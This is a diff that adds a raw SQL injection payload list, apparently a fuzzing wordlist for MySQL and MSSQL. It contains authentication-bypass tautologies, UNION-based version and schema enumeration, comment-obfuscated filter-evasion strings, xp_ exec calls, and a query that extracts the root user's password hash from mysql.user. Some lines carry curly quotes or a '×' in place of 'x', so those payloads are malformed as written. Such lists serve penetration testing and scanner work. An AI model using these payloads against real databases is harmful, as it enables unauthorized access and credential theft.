@@ -1,0 +1,76 @@
+' UNION SELECT (CONNECTION_ID()-CONNECTION_ID()) #
+/*!32302 and 1=0*/
+‘ UNION SELECT @@version,NULL,NULL #
+' 1=2 or select @@version #
+' union select @@version #
+' select @@version #
+' SELECT 1; #comment
+' SELECT /*comment*/1;
+' SELECT 6 & 2; #
+' SELECT 6 & 1; #
+' SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 2; #
+' SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 3; #
+' SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 4; #
+' SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 5; #
+' SELECT substr(‘abcd’, 3, 1); #
+' SELECT ascii(‘A’); #
+' SELECT char(65); #
+' SELECT cast(’1′ AS unsigned integer); #
+' 1SELECT cast(’123′ AS char); #
+); SELECT schema_name FROM information_schema.schemata; #
+SELECT schema_name FROM information_schema.schemata); #
+SELECT distinct(db) FROM mysql.db #
+'); SELECT distinct(db) FROM mysql.db #
+'SELECT cast(’123′ AS char); #
+); SELECT cast(’123′ AS char); #
+'SELECT CONCAT(‘A’,'B’); #
+'SELECT CONCAT(‘A’,'B’,'C’); #
+'SELECT 0×414243; #
+'); SELECT 0×414243 #
+' SELECT @@datadir; #
+' SELECT @@hostname; #
+'); SELECT @@hostname; #
+1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 or 1=1
+1' or '1'='1
+-- -
+;%00
+`
+' OR 1=1 -- -' ORDER BY id;
+' UNION SELECT 1, 2, 3`
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+'='
+'LIKE'
+'=0--+
+SELECT * FROM Users WHERE username = 'Mike' AND password = ''=''
+SELECT * FROM Users WHERE username = 'Mike' AND password =
+'' OR '' = ''
+VERSION();
+@@VERSION;
+@@GLOBAL.VERSION
+AND MID(VERSION(),1,1) = '5
+VERSION/**/(/**/)
+1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);
+UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+
+UNION SELECT schema_name FROM information_schema.schemata
+SELECT DISTINCT(db) FROM mysql.db
+ORDER BY 1
+ORDER BY 2
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 4--
+-1' UNION SELECT 1,2,3--
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
+AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)--
+SELECT current_user;
+UNION SELECT CONCAT(user, 0x3A, password) FROM mysql.user WHERE user = 'root'
+information_schema.schemata, mysql.db
+schema_name, db --
+database(), schema() --
